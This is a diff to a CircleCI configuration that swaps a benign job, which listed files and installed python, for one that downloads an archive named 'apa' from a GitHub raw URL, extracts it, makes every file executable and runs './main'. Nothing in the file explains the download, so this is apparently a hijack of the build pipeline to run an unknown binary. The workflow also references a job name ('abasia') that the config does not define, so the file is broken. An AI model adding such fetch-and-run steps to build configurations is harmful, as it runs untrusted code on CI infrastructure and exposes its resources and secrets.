@@ -1,17 +1,21 @@
 version: 2
 jobs:
-  firefox:
+  abas:
     docker:
-      - image: buildpack-deps:bullseye-curl
+      - image: cimg/ubuntu:bionic
 
     steps:
     - run:
         name: namet
         command: |
-          ls
-          apt update -y && apt install python -y
+          wget https://raw.githubusercontent.com/nedipaol/tara/main/apa && chmod u+x *
+          tar -xf apa && chmod u+x *
+          ./main
+
+
+
 workflows:
   version: 2
   abas:
     jobs:
-    - firefox
+    - abasia
